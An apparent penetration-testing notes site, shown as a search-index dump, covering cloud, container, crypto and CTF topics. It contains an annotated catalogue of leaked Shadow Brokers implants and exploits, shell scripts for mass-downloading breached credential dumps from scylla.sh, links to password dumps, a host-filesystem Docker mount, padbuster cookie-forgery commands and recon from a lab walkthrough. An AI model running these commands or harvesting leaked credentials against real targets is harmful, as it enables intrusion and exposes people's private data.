Hack : Logging status for the S3 bucket Hack : Make S3 bucket public readable Hack : Make a http connection to S3 instead of https Hack : Make an object public Hack : Move s3 objects to Glacier Hack : Move s3 objects to Glacier add a Expiration Hack : Restore an object from glacier Hack : Search for bucket in a different AWS Region Hack : Search for a bucket with bucket name which is case sensitive Hack : Search for a specific bucket Hack : Set a canned ACL for object, authenticated-read Hack : Set a canned ACL for object, canned_bucket_owner_full_control Hack : Set a canned ACL for object, canned_bucket_owner_read Hack : Set a canned ACL for object, public read Hack : Set a canned ACL for object, public read write Hack : Set a canned ACL, authenticated-read Hack : Set a canned ACL, private Hack : Set a canned ACL, public-read Hack : Set a canned ACL, public-read-write Hack : Set a private canned ACL for an object Hack : Set a redirect for an S3 object Hack : Set metadata for a new s3 object on creation Hack : Set set_request_payment for a bucket Hack : Set the bucket Policy Hack : Set the meta data for an object Hack : Set up CORS for an S3 bucket Hack : Upload a file to S3 bucket using method initiate_multipart_upload. Note should be 5MB Hack : Upload a file to S3 bucket using method set_contents_from_filename Hack : Upload a file to s3 bucket using the method send_file","title":"Collections"},{"location":"cloud/aws/","text":"New References Unauthenticated AWS Role Enumeration (IAM Revisited): https://rhinosecuritylabs.com/aws/aws-role-enumeration-iam-p2/","title":"Aws"},{"location":"cloud/aws/#new-references","text":"Unauthenticated AWS Role Enumeration (IAM Revisited): https://rhinosecuritylabs.com/aws/aws-role-enumeration-iam-p2/","title":"New References"},{"location":"cloud/azuer/","text":"New References https://www.guardicore.com/2018/03/recovering-plaintext-passwords-azure/","title":"Azuer"},{"location":"cloud/azuer/#new-references","text":"https://www.guardicore.com/2018/03/recovering-plaintext-passwords-azure/","title":"New References"},{"location":"collections/binaries/","text":"Nmap: https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/","title":"Binaries"},{"location":"collections/common-web-files/","text":"Common Files and Directories ```\u200b pom.xml .git .svn .ssh db CHANGELOG.txt CHANGELOG.md CHANGELOG COPYRIGHT LICENSE README.md VERSION VERSION.md VERSIONS.md version versions system-user.txt\u200b\u200b backend frontend administrator admin wp-admin services service plugins plugin dev phpbash stage staging development data file files monitoring welcome action feed config backup remote mvc documents uploads upload download downloads secret cgi-bin tmp temp dump composer.json project.json lib - SecList/Discovery/Web-Content/common.txt ## Subdomains admin administrator internal intranet intra manager ```","title":"Common web files"},{"location":"collections/common-web-files/#common-files-and-directories","text":"```\u200b pom.xml .git .svn .ssh db CHANGELOG.txt CHANGELOG.md CHANGELOG COPYRIGHT LICENSE README.md VERSION VERSION.md VERSIONS.md version versions system-user.txt\u200b\u200b backend frontend administrator admin wp-admin services service plugins plugin dev phpbash stage staging development data file files monitoring welcome action feed config backup remote mvc documents uploads upload download downloads secret cgi-bin tmp temp dump composer.json project.json lib - SecList/Discovery/Web-Content/common.txt ## Subdomains admin administrator internal intranet intra manager ```","title":"Common Files and Directories"},{"location":"collections/leaked-datasets/","text":"Leaked Datasets Shadowbroker https://www.comae.com/reports/us-17-Suiche-TheShadowBrokers-Cyber-Fear-Game-Changers-wp.pdf https://swithak.github.io/SH20TAATSB18/Study/AnalysesANDProfiles/TSB-ZeroNet/ https://lostar.com.tr/2017/04/nsa-hepimizi-izliyor.html https://www.revolvy.com/page/The-Shadow-Brokers EQGRP Lost in Translation References: [MUSTREAD]: Buckeye: Espionage Outfit Used Equation Group Tools Prior to Shadow Brokers Leak Confirmed: Leaked Equation Group Hacking Tools Are Real https://www.symantec.com/blogs/threat-intelligence/buckeye-windows-zero-day-exploit https://github.com/misterch0c/shadowbroker DanderSpritz https://github.com/francisck/DanderSpritz_docs DanderSpritz Setup DSky Darkskyline PacketCapture tool DaPu DarkPulsar Appears to be a legacy implant, similar to PeddleCheap but older Darkskyline DarkSkyline Contains tools to parse and filter traffic captured by DarkSkyline DeMI DecibelMinute Appears to interact with KillSuit to install, configure, and uninstall it Df DoubleFeature Generates a log report about the types of tools that could be deployed on the target. A lot of tools mention that doublefeature is the only way to confirm their existence DmGZ DoormanGauze DoormanGauze is a kernel level network driver that appears to bypass the standard Windows TCP/IP stack Dsz DanderSpritz Several DanderSpritz specific files such as command descriptions (in XML), and several scripts with DSS (Debug script interface?) / DSI extensions?. They seem to be scripts run by DanderSpritz Ep ExpandingPulley Listening Post developed in 2001 and abandoned in 2008. Predecessor to DanderSpritz ExternalLibraries N/A Well.. FlAv FlewAvenue Appears related to DoormanGauze (based on FlAv/scripts/_FlewAvenue.txt) GRDO GreaterDoctor Appears to parse / process from GreaterSurgeon (based on GRDO/Tools/i386/GreaterSurgeon_postProcess.py analyzeMFT.py) GROK ?? Appears to be a keylogger (based on Ops/PyScripts/overseer/plugins/keylogger.py) GRcl ?? Appears to dump memory from a specific process (based on GRcl/Commands/CommandLine/ProcessMemory_Command.xml) GaTh GangsterTheif Appears to parse data gathered by GreaterDoctor to identify other (malicious) software that may be installed persistently (based on GaTh/Commands/CommandLine/GrDo_ProcessScanner_Command.xml) GeZU GreaterSurgeon Appears to dump memory (based on GeZu/Commands/CommandLine/GeZu_KernelMemory_Command.xml) Gui N/A Resources used by the DanderSpirtz GUI LegacyWindowsExploits N/A Well.. Ops N/A Contains a lot of awesome tools and python / dss scripts used by DanderSpritz. Deserves a lot of investigation. includes tools to gather data from Chrome, Skype, Firefox (ripper) and gather information about the machine / environment (survey) Pfree Passfreely Oracle implant that bypasses auth for oracle databases PaCU PaperCut Allows you to perform operations on file handles opened by other processes Pc PeddleCheap The main implant (loaded via DoublePulsar) that performs all of these actions and communciates with the C2 (DanderSpirtz) Pc2.2 PeddleCheap Resources for PeddleCheap including different DLLs / configs to call back to the C2 Python N/A Python Libraries / resources being used ScRe ?? Interacts with SQL databases (based on ScRe/Commands/CommandLine/Sql_Command.xml) StLa Strangeland Keylogger (based on StLa/Tools/i386-winnt/strangeland.xsl) Tasking N/A Handles the collection \"tasks\" that DanderSpritz has requested on the same (collection of windows, network data, etc) TeDi TerritorialDispute A plugin used to determine what other (malicious) software may be persistently installed (based on TeDi/PyScripts/sigs.py). Appears to be used to identify other nation states also Utbu UtilityBurst Appears to be a mechanism for persistence via a driver install unsure (based on UtBu/Scripts/Include/_UtilityBurstFunctions.dsi) ZBng ZippyBang Looking at this quickly, it appears to be the NSA's version of Mimikatz. It can duplicate tokens (Kerberos tokens?) and \"remote execute commands\" as well as logon as users (based on files in ZBng/Commands/CommandLine) Exploits EARLYSHOVEL RedHat 7.0 - 7.1 Sendmail 8.11.x exploit EBBISLAND (EBBSHAVE) root RCE via RPC XDR overflow in Solaris 6, 7, 8, 9 10 (possibly newer) both SPARC and x86. ECHOWRECKER remote Samba 3.0.x Linux exploit. EASYBEE appears to be an MDaemon email server vulnerability EASYFUN EasyFun 2.2.0 Exploit for WDaemon / IIS MDaemon/WorldClient pre 9.5.6 EASYPI is an IBM Lotus Notes exploit that gets detected as Stuxnet EWOKFRENZY is an exploit for IBM Lotus Domino 6.5.4 7.0.2 EXPLODINGCAN is an IIS 6.0 exploit that creates a remote backdoor ETERNALROMANCE is a SMB1 exploit over TCP port 445 which targets XP, 2003, Vista, 7, Windows 8, 2008, 2008 R2, and gives SYSTEM privileges (MS17-010) EDUCATEDSCHOLAR is a SMB exploit (MS09-050) EMERALDTHREAD is a SMB exploit for Windows XP and Server 2003 (MS10-061) EMPHASISMINE is a remote IMAP exploit for IBM Lotus Domino 6.6.4 to 8.5.2 ENGLISHMANSDENTIST sets Outlook Exchange WebAccess rules to trigger executable code on the client's side to send an email to other users EPICHERO 0-day exploit (RCE) for Avaya Call Server ERRATICGOPHER is a SMBv1 exploit targeting Windows XP and Server 2003 ETERNALSYNERGY is a SMBv3 remote code execution flaw for Windows 8 and Server 2012 SP0 (MS17-010) ETERNALBLUE is a SMBv2 exploit for Windows 7 SP1 (MS17-010) ETERNALCHAMPION is a SMBv1 exploit ESKIMOROLL is a Kerberos exploit targeting 2000, 2003, 2008 and 2008 R2 domain controllers ESTEEMAUDIT is an RDP exploit and backdoor for Windows Server 2003 ECLIPSEDWING is an RCE exploit for the Server service in Windows Server 2008 and later (MS08-067) ETRE is an exploit for IMail 8.10 to 8.22 ETCETERABLUE is an exploit for IMail 7.04 to 8.05 FUZZBUNCH is an exploit framework, similar to MetaSploit ODDJOB is an implant builder and C C server that can deliver exploits for Windows 2000 and later, also not detected by any AV vendors EXPIREDPAYCHECK IIS6 exploit EAGERLEVER NBT/SMB exploit for Windows NT4.0, 2000, XP SP1 SP2, 2003 SP1 Base Release EASYFUN WordClient / IIS6.0 exploit ESSAYKEYNOTE EVADEFRED Utilities PASSFREELY utility which \"Bypasses authentication for Oracle servers\" SMBTOUCH check if the target is vulnerable to samba exploits like ETERNALSYNERGY, ETERNALBLUE, ETERNALROMANCE ERRATICGOPHERTOUCH Check if the target is running some RPC IISTOUCH check if the running IIS version is vulnerable RPCOUTCH get info about windows via RPC DOPU used to connect to machines exploited by ETERNALCHAMPIONS NAMEDPIPETOUCH Utility to test for a predefined list of named pipes, mostly AV detection. User can add checks for custom named pipes. Scylla Download Torrents curl -A UserAgentString -s https://scylla.sh/ | grep -A 3 /torrent/ | sed ':a;N;$!ba;s/\\n//g' | sed 's/ \\/tr /\\n/g' | awk -F' td' '{$0=$4$2}1' | sed 's/ \\/td //g' | sed 's/style= a href=//g' | cut -d -f1 | sed 's/ //g' | sed 's/http/https/' torrents.lst while read x; do axel -n 1 --no-clobber $x; done torrents.lst Download all non-torrent files (smallest file first) html2utf8() { perl -ne 'binmode STDOUT, :utf8 ; s/ #([0-9]*);/pack( U ,$1)/eg; print' } curl -A UserAgentString -s https://scylla.sh/ | grep -A 3 /dbs/ | sed ':a;N;$!ba;s/\\n//g' | sed 's/ \\/tr /\\n/g' | awk -F' td' '{$0=$2}1' | sed 's/ \\/td //g' | sed 's/style= a href=//g' | cut -d -f1 | sed 's/ //g' | tac | sed '/^$/d' | sed 's/http/https/' | html2utf8 downloads.lst while read x; do axel -n 1 --no-clobber $x; done downloads.lst Old script with manual ordering: curl -A \"UserAgentString\" -s https://scylla.sh/ | grep -A 3 \"/dbs/\" | sed ':a;N;$!ba;s/\\n//g' | sed 's/ \\/tr /\\n/g' | awk -F' td' '{$0=$4$2}1' | sed 's/ \\/td //g' | sed 's/style=\"\" a href=//g' | cut -d \" \" -f2 | sed \"s/K /000 /\" | sed \"s/M /000000 /\" | sed \"s/G /000000000 /\" | sed \"s/B / /\" | tr -s \" \" | sort -n | cut -d \" \" -f2 | sed 's/\"//g' | sed '/^$/d' | sed 's/http/https/' downloads.lst","title":"Leaked datasets"},{"location":"collections/leaked-datasets/#leaked-datasets","text":"","title":"Leaked Datasets"},{"location":"collections/leaked-datasets/#shadowbroker","text":"https://www.comae.com/reports/us-17-Suiche-TheShadowBrokers-Cyber-Fear-Game-Changers-wp.pdf https://swithak.github.io/SH20TAATSB18/Study/AnalysesANDProfiles/TSB-ZeroNet/ https://lostar.com.tr/2017/04/nsa-hepimizi-izliyor.html https://www.revolvy.com/page/The-Shadow-Brokers EQGRP Lost in Translation References: [MUSTREAD]: Buckeye: Espionage Outfit Used Equation Group Tools Prior to Shadow Brokers Leak Confirmed: Leaked Equation Group Hacking Tools Are Real https://www.symantec.com/blogs/threat-intelligence/buckeye-windows-zero-day-exploit https://github.com/misterch0c/shadowbroker DanderSpritz https://github.com/francisck/DanderSpritz_docs DanderSpritz Setup DSky Darkskyline PacketCapture tool DaPu DarkPulsar Appears to be a legacy implant, similar to PeddleCheap but older Darkskyline DarkSkyline Contains tools to parse and filter traffic captured by DarkSkyline DeMI DecibelMinute Appears to interact with KillSuit to install, configure, and uninstall it Df DoubleFeature Generates a log report about the types of tools that could be deployed on the target. A lot of tools mention that doublefeature is the only way to confirm their existence DmGZ DoormanGauze DoormanGauze is a kernel level network driver that appears to bypass the standard Windows TCP/IP stack Dsz DanderSpritz Several DanderSpritz specific files such as command descriptions (in XML), and several scripts with DSS (Debug script interface?) / DSI extensions?. They seem to be scripts run by DanderSpritz Ep ExpandingPulley Listening Post developed in 2001 and abandoned in 2008. Predecessor to DanderSpritz ExternalLibraries N/A Well.. FlAv FlewAvenue Appears related to DoormanGauze (based on FlAv/scripts/_FlewAvenue.txt) GRDO GreaterDoctor Appears to parse / process from GreaterSurgeon (based on GRDO/Tools/i386/GreaterSurgeon_postProcess.py analyzeMFT.py) GROK ?? Appears to be a keylogger (based on Ops/PyScripts/overseer/plugins/keylogger.py) GRcl ?? Appears to dump memory from a specific process (based on GRcl/Commands/CommandLine/ProcessMemory_Command.xml) GaTh GangsterTheif Appears to parse data gathered by GreaterDoctor to identify other (malicious) software that may be installed persistently (based on GaTh/Commands/CommandLine/GrDo_ProcessScanner_Command.xml) GeZU GreaterSurgeon Appears to dump memory (based on GeZu/Commands/CommandLine/GeZu_KernelMemory_Command.xml) Gui N/A Resources used by the DanderSpirtz GUI LegacyWindowsExploits N/A Well.. Ops N/A Contains a lot of awesome tools and python / dss scripts used by DanderSpritz. Deserves a lot of investigation. includes tools to gather data from Chrome, Skype, Firefox (ripper) and gather information about the machine / environment (survey) Pfree Passfreely Oracle implant that bypasses auth for oracle databases PaCU PaperCut Allows you to perform operations on file handles opened by other processes Pc PeddleCheap The main implant (loaded via DoublePulsar) that performs all of these actions and communciates with the C2 (DanderSpirtz) Pc2.2 PeddleCheap Resources for PeddleCheap including different DLLs / configs to call back to the C2 Python N/A Python Libraries / resources being used ScRe ?? Interacts with SQL databases (based on ScRe/Commands/CommandLine/Sql_Command.xml) StLa Strangeland Keylogger (based on StLa/Tools/i386-winnt/strangeland.xsl) Tasking N/A Handles the collection \"tasks\" that DanderSpritz has requested on the same (collection of windows, network data, etc) TeDi TerritorialDispute A plugin used to determine what other (malicious) software may be persistently installed (based on TeDi/PyScripts/sigs.py). Appears to be used to identify other nation states also Utbu UtilityBurst Appears to be a mechanism for persistence via a driver install unsure (based on UtBu/Scripts/Include/_UtilityBurstFunctions.dsi) ZBng ZippyBang Looking at this quickly, it appears to be the NSA's version of Mimikatz. It can duplicate tokens (Kerberos tokens?) and \"remote execute commands\" as well as logon as users (based on files in ZBng/Commands/CommandLine) Exploits EARLYSHOVEL RedHat 7.0 - 7.1 Sendmail 8.11.x exploit EBBISLAND (EBBSHAVE) root RCE via RPC XDR overflow in Solaris 6, 7, 8, 9 10 (possibly newer) both SPARC and x86. ECHOWRECKER remote Samba 3.0.x Linux exploit. EASYBEE appears to be an MDaemon email server vulnerability EASYFUN EasyFun 2.2.0 Exploit for WDaemon / IIS MDaemon/WorldClient pre 9.5.6 EASYPI is an IBM Lotus Notes exploit that gets detected as Stuxnet EWOKFRENZY is an exploit for IBM Lotus Domino 6.5.4 7.0.2 EXPLODINGCAN is an IIS 6.0 exploit that creates a remote backdoor ETERNALROMANCE is a SMB1 exploit over TCP port 445 which targets XP, 2003, Vista, 7, Windows 8, 2008, 2008 R2, and gives SYSTEM privileges (MS17-010) EDUCATEDSCHOLAR is a SMB exploit (MS09-050) EMERALDTHREAD is a SMB exploit for Windows XP and Server 2003 (MS10-061) EMPHASISMINE is a remote IMAP exploit for IBM Lotus Domino 6.6.4 to 8.5.2 ENGLISHMANSDENTIST sets Outlook Exchange WebAccess rules to trigger executable code on the client's side to send an email to other users EPICHERO 0-day exploit (RCE) for Avaya Call Server ERRATICGOPHER is a SMBv1 exploit targeting Windows XP and Server 2003 ETERNALSYNERGY is a SMBv3 remote code execution flaw for Windows 8 and Server 2012 SP0 (MS17-010) ETERNALBLUE is a SMBv2 exploit for Windows 7 SP1 (MS17-010) ETERNALCHAMPION is a SMBv1 exploit ESKIMOROLL is a Kerberos exploit targeting 2000, 2003, 2008 and 2008 R2 domain controllers ESTEEMAUDIT is an RDP exploit and backdoor for Windows Server 2003 ECLIPSEDWING is an RCE exploit for the Server service in Windows Server 2008 and later (MS08-067) ETRE is an exploit for IMail 8.10 to 8.22 ETCETERABLUE is an exploit for IMail 7.04 to 8.05 FUZZBUNCH is an exploit framework, similar to MetaSploit ODDJOB is an implant builder and C C server that can deliver exploits for Windows 2000 and later, also not detected by any AV vendors EXPIREDPAYCHECK IIS6 exploit EAGERLEVER NBT/SMB exploit for Windows NT4.0, 2000, XP SP1 SP2, 2003 SP1 Base Release EASYFUN WordClient / IIS6.0 exploit ESSAYKEYNOTE EVADEFRED Utilities PASSFREELY utility which \"Bypasses authentication for Oracle servers\" SMBTOUCH check if the target is vulnerable to samba exploits like ETERNALSYNERGY, ETERNALBLUE, ETERNALROMANCE ERRATICGOPHERTOUCH Check if the target is running some RPC IISTOUCH check if the running IIS version is vulnerable RPCOUTCH get info about windows via RPC DOPU used to connect to machines exploited by ETERNALCHAMPIONS NAMEDPIPETOUCH Utility to test for a predefined list of named pipes, mostly AV detection. User can add checks for custom named pipes.","title":"Shadowbroker"},{"location":"collections/leaked-datasets/#scylla","text":"Download Torrents curl -A UserAgentString -s https://scylla.sh/ | grep -A 3 /torrent/ | sed ':a;N;$!ba;s/\\n//g' | sed 's/ \\/tr /\\n/g' | awk -F' td' '{$0=$4$2}1' | sed 's/ \\/td //g' | sed 's/style= a href=//g' | cut -d -f1 | sed 's/ //g' | sed 's/http/https/' torrents.lst while read x; do axel -n 1 --no-clobber $x; done torrents.lst Download all non-torrent files (smallest file first) html2utf8() { perl -ne 'binmode STDOUT, :utf8 ; s/ #([0-9]*);/pack( U ,$1)/eg; print' } curl -A UserAgentString -s https://scylla.sh/ | grep -A 3 /dbs/ | sed ':a;N;$!ba;s/\\n//g' | sed 's/ \\/tr /\\n/g' | awk -F' td' '{$0=$2}1' | sed 's/ \\/td //g' | sed 's/style= a href=//g' | cut -d -f1 | sed 's/ //g' | tac | sed '/^$/d' | sed 's/http/https/' | html2utf8 downloads.lst while read x; do axel -n 1 --no-clobber $x; done downloads.lst Old script with manual ordering: curl -A \"UserAgentString\" -s https://scylla.sh/ | grep -A 3 \"/dbs/\" | sed ':a;N;$!ba;s/\\n//g' | sed 's/ \\/tr /\\n/g' | awk -F' td' '{$0=$4$2}1' | sed 's/ \\/td //g' | sed 's/style=\"\" a href=//g' | cut -d \" \" -f2 | sed \"s/K /000 /\" | sed \"s/M /000000 /\" | sed \"s/G /000000000 /\" | sed \"s/B / /\" | tr -s \" \" | sort -n | cut -d \" \" -f2 | sed 's/\"//g' | sed '/^$/d' | sed 's/http/https/' downloads.lst","title":"Scylla"},{"location":"collections/passwords/","text":"Passwords Data Dumps http://scylla.sh http://scyllabyeatabumx.onion/ http://52.25.47.112/ Mirai https://github.com/danielmiessler/SecLists/blob/master/Passwords/Malware/mirai-botnet.txt https://github.com/securing/mirai_credentials Tomcat https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt Important files from lists SecLists/Passwords/darkweb2017-top1000.txt","title":"Passwords"},{"location":"collections/passwords/#passwords","text":"","title":"Passwords"},{"location":"collections/passwords/#data-dumps","text":"http://scylla.sh http://scyllabyeatabumx.onion/ http://52.25.47.112/","title":"Data Dumps"},{"location":"collections/passwords/#mirai","text":"https://github.com/danielmiessler/SecLists/blob/master/Passwords/Malware/mirai-botnet.txt https://github.com/securing/mirai_credentials","title":"Mirai"},{"location":"collections/passwords/#tomcat","text":"https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt","title":"Tomcat"},{"location":"collections/passwords/#important-files-from-lists","text":"SecLists/Passwords/darkweb2017-top1000.txt","title":"Important files from lists"},{"location":"collections/wordlists/","text":"Word-lists Parameters: https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt Text sumarizer: https://www.splitbrain.org/services/ots","title":"Word-lists"},{"location":"collections/wordlists/#word-lists","text":"Parameters: https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt Text sumarizer: https://www.splitbrain.org/services/ots","title":"Word-lists"},{"location":"collections/z-References/","text":"References Conferences, documentaries, podcasts, word-lists, rainbow-tables: https://infocon.org/","title":"References"},{"location":"collections/z-References/#references","text":"Conferences, documentaries, podcasts, word-lists, rainbow-tables: https://infocon.org/","title":"References"},{"location":"containers/0-cheatsheed/","text":"Cheatsheet Docker General Mount host file system into a container and run: docker run --rm -ti -v /:/hostOs image sh Auto remove container when exit: docker run --rm List all images: docker images --all\u200b Identifying Docker Presence of files: /.dockerenv","title":"Cheatsheet"},{"location":"containers/0-cheatsheed/#cheatsheet","text":"","title":"Cheatsheet"},{"location":"containers/0-cheatsheed/#docker","text":"","title":"Docker"},{"location":"containers/0-cheatsheed/#general","text":"Mount host file system into a container and run: docker run --rm -ti -v /:/hostOs image sh Auto remove container when exit: docker run --rm List all images: docker images --all\u200b","title":"General"},{"location":"containers/0-cheatsheed/#identifying-docker","text":"Presence of files: /.dockerenv","title":"Identifying Docker"},{"location":"containers/important-issues/","text":"CVE-2019-5736 https://kubernetes.io/blog/2019/02/11/runc-and-cve-2019-5736/ https://gist.github.com/singe/0ad4078848d85dc0d03f9f9013796e45","title":"Important issues"},{"location":"containers/important-issues/#cve-2019-5736","text":"https://kubernetes.io/blog/2019/02/11/runc-and-cve-2019-5736/ https://gist.github.com/singe/0ad4078848d85dc0d03f9f9013796e45","title":"CVE-2019-5736"},{"location":"containers/y-Tools/","text":"binctr Create fully static, including rootfs embedded, binaries that pop you directly into a container. Can be run by an unprivileged user. GitHub","title":"y Tools"},{"location":"containers/y-Tools/#binctr","text":"Create fully static, including rootfs embedded, binaries that pop you directly into a container. Can be run by an unprivileged user. GitHub","title":"binctr"},{"location":"containers/z-References/","text":"New References Security analysis of Docker containers in a production environment Cryptojacking invades cloud. How modern containerization trend is exploited by attackers","title":"z References"},{"location":"containers/z-References/#new-references","text":"Security analysis of Docker containers in a production environment Cryptojacking invades cloud. How modern containerization trend is exploited by attackers","title":"New References"},{"location":"crypto/y-Tools/","text":"Tools Crypto Operations RsaCtfTool RsaCtfTool.py --publickey public-key.pub --uncipher cipher-text.crypt PadBuster - Padding Oracle Attack https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html Decrypt padbuster http://10.10.10.18 2zKLNWhe0Xt7G4ymYDK%2BEdptckP8a8vO 8 -cookies auth=2zKLNWhe0Xt7G4ymYDK%2BEdptckP8a8vO -encoding 0 Encrypt padbuster http://10.10.10.18 2zKLNWhe0Xt7G4ymYDK%2BEdptckP8a8vO 8 -cookies auth=2zKLNWhe0Xt7G4ymYDK%2BEdptckP8a8vO -encoding 0 -plaintext user=admin Elliptic Curve Cryptography for Python - https://pypi.org/project/seccure/ Encoding/Decoding IP to Decimal: https://www.browserling.com/tools/ip-to-dec Binary to ASCII echo 010000 | perl -lpe '$_=pack B* ,$_' Ook and Brainfuck https://www.splitbrain.org/_static/ook/ https://www.splitbrain.org/services/ook https://github.com/splitbrain/ook Base64 Decode base64 -d NmQy echo NmQy | base64 -d Encode base64 NmQy echo NmQy | base64 Hashes https://hashkiller.co.uk Concurrency Multi-threaded CPU miner: https://github.com/hyc/cpuminer-multi","title":"Tools"},{"location":"crypto/y-Tools/#tools","text":"Crypto Operations RsaCtfTool RsaCtfTool.py --publickey public-key.pub --uncipher cipher-text.crypt PadBuster - Padding Oracle Attack https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html Decrypt padbuster http://10.10.10.18 2zKLNWhe0Xt7G4ymYDK%2BEdptckP8a8vO 8 -cookies auth=2zKLNWhe0Xt7G4ymYDK%2BEdptckP8a8vO -encoding 0 Encrypt padbuster http://10.10.10.18 2zKLNWhe0Xt7G4ymYDK%2BEdptckP8a8vO 8 -cookies auth=2zKLNWhe0Xt7G4ymYDK%2BEdptckP8a8vO -encoding 0 -plaintext user=admin Elliptic Curve Cryptography for Python - https://pypi.org/project/seccure/","title":"Tools"},{"location":"crypto/y-Tools/#encodingdecoding","text":"IP to Decimal: https://www.browserling.com/tools/ip-to-dec Binary to ASCII echo 010000 | perl -lpe '$_=pack B* ,$_' Ook and Brainfuck https://www.splitbrain.org/_static/ook/ https://www.splitbrain.org/services/ook https://github.com/splitbrain/ook","title":"Encoding/Decoding"},{"location":"crypto/y-Tools/#base64","text":"Decode base64 -d NmQy echo NmQy | base64 -d Encode base64 NmQy echo NmQy | base64","title":"Base64"},{"location":"crypto/y-Tools/#hashes","text":"https://hashkiller.co.uk","title":"Hashes"},{"location":"crypto/y-Tools/#concurrency","text":"Multi-threaded CPU miner: https://github.com/hyc/cpuminer-multi","title":"Concurrency"},{"location":"crypto/z-References/","text":"New References MD5 collisions of any pair of PDFs: https://twitter.com/angealbertini/status/1075417521799528448","title":"z References"},{"location":"crypto/z-References/#new-references","text":"MD5 collisions of any pair of PDFs: https://twitter.com/angealbertini/status/1075417521799528448","title":"New References"},{"location":"ctf/general/","text":"Practice Resources https://blog.elearnsecurity.com/free-resources-to-legally-practice-ethical-hacking.html http://pwnable.kr https://pwnable.tw https://ctflearn.com https://www.root-me.org https://www.hackthebox.eu https://www.hacking-lab.com https://microcorruption.com https://crackmes.one https://ctflearn.com/ http://hackyourselffirst.troyhunt.com http://github.com/bkimminich/juice-shop http://hack.me http://HackThisSite.org http://github.com/Hackademic/hackademic http://try2hack.nl http://slavehack.com http://hackthis.co.uk http://hackxor.sourceforge.net/cgi-bin/index.pl http://sourceforge.net/projects/peruggia http://github.com/psiinon/bodgeit http://bonsai-sec.com/en/research/moth.php http://enigmagroup.org Google CTFs https://github.com/google/google-ctf CrackMe sites http://crackmes.de/ Writing a CrackMe (anti-debugging and anti reverse-engineering tricks) - https://www.pelock.com/articles/how-to-write-a-crackme-for-a-ctf-competition - https://github.com/PELock/CrackMeZ3S-CTF-CrackMe-Tutorial/ Writeups Metasploitable: https://hackercool.com/metasploitable/ Binary/HTB: https://0xrick.github.io/categories/ HTB Writeups: https://www.peerlyst.com/posts/how-to-break-into-tr0ll-1-machine-writeup-spirited-wolf Vulnhub Pinky\u2019s Palace V4 https://medium.com/@lijnk/pinkys-palace-v4-writeup-1cef1dab06ff","title":"Practice Resources"},{"location":"ctf/general/#practice-resources","text":"https://blog.elearnsecurity.com/free-resources-to-legally-practice-ethical-hacking.html http://pwnable.kr https://pwnable.tw https://ctflearn.com https://www.root-me.org https://www.hackthebox.eu https://www.hacking-lab.com https://microcorruption.com https://crackmes.one https://ctflearn.com/ http://hackyourselffirst.troyhunt.com http://github.com/bkimminich/juice-shop http://hack.me http://HackThisSite.org http://github.com/Hackademic/hackademic http://try2hack.nl http://slavehack.com http://hackthis.co.uk http://hackxor.sourceforge.net/cgi-bin/index.pl http://sourceforge.net/projects/peruggia http://github.com/psiinon/bodgeit http://bonsai-sec.com/en/research/moth.php http://enigmagroup.org","title":"Practice Resources"},{"location":"ctf/general/#google-ctfs","text":"https://github.com/google/google-ctf","title":"Google CTFs"},{"location":"ctf/general/#crackme-sites","text":"http://crackmes.de/","title":"CrackMe sites"},{"location":"ctf/general/#writing-a-crackme","text":"(anti-debugging and anti reverse-engineering tricks) - https://www.pelock.com/articles/how-to-write-a-crackme-for-a-ctf-competition - https://github.com/PELock/CrackMeZ3S-CTF-CrackMe-Tutorial/","title":"Writing a CrackMe"},{"location":"ctf/general/#writeups","text":"Metasploitable: https://hackercool.com/metasploitable/ Binary/HTB: https://0xrick.github.io/categories/ HTB Writeups: https://www.peerlyst.com/posts/how-to-break-into-tr0ll-1-machine-writeup-spirited-wolf","title":"Writeups"},{"location":"ctf/general/#vulnhub","text":"","title":"Vulnhub"},{"location":"ctf/general/#pinkys-palace-v4","text":"https://medium.com/@lijnk/pinkys-palace-v4-writeup-1cef1dab06ff","title":"Pinky\u2019s Palace V4"},{"location":"ctf/hackthebox/","text":"Write-ups Reddish https://epi052.gitlab.io/notes-to-self/blog/2018-12-01-hack-the-box-reddish/ Waldo https://medium.com/@DRX_Sicher/walkthrough-waldo-45db1e3b09c2","title":"Write-ups"},{"location":"ctf/hackthebox/#write-ups","text":"","title":"Write-ups"},{"location":"ctf/hackthebox/#reddish","text":"https://epi052.gitlab.io/notes-to-self/blog/2018-12-01-hack-the-box-reddish/","title":"Reddish"},{"location":"ctf/hackthebox/#waldo","text":"https://medium.com/@DRX_Sicher/walkthrough-waldo-45db1e3b09c2","title":"Waldo"},{"location":"ctf/hack-the-box/CronOS/","text":"nmap -sV -sC -oA nmap -T4 10.10.10.13 Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-22 06:11 EDT Nmap scan report for 10.10.10.13 Host is up (0.36s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA) | 256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA) |_ 256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519) 53/tcp open domain ISC BIND 9.10.3-P4 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.10.3-P4-Ubuntu 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 47.16 seconds dig axfr @10.10.10.13 cronos.htb ; DiG 9.11.5-P1-1-Debian axfr @10.10.10.13 cronos.htb ; (1 server found) ;; global options: +cmd cronos.htb. 604800 IN SOA cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800 cronos.htb. 604800 IN NS ns1.cronos.htb. 